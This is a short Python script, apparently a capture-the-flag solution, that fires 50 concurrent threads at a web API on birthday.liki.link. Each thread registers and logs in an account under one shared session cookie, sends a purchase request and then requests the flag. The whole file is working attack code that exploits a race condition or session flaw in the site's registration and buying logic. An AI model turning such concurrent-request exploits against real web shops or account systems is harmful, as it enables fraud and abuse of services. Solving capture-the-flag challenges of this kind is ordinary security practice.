#coding=utf-8
#Author:Leonsec
#Mail:leonsec@163.com
#Date:2021年2月13日 12:00:21

import threading
import requests

cookies = dict(PHPSESSID='bkc42sk9iqrj8gtom9rt01ats9')

def reg_login(name):
   reg_url = 'https://birthday.liki.link/API/?m=register'
   login_url = 'https://birthday.liki.link/API/?m=login'
   global cookies
   payload = {
       "name": "leon{}".format(name),
       "password": 'a'
   }
   r = requests.post(reg_url, data=payload, cookies=cookies)
   r = requests.post(login_url, data=payload, cookies=cookies)
   #print(r.text)

def buy():
   buy_url = 'https://birthday.liki.link/API/?m=buy'
   global cookies
   payload = {
       "amount": "25"
   }
   r = requests.post(buy_url, data=payload, cookies=cookies)
   #print(r.text)

def flag():
   flag_url = 'https://birthday.liki.link/API/?m=getflag'
   global cookies
   r = requests.get(flag_url, cookies=cookies)
   if 'success' in r.text:
      print(r.text)

def main(name):
   print('线程%s 开始' % name)
   reg_login(name)
   buy()
   flag()
   print('线程%s 结束' % name)

if __name__ == '__main__':
    threads = []
    thread_name = list(range(1, 50+1))
    for name in thread_name:
        t = threading.Thread(target=main, args=(name,))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()
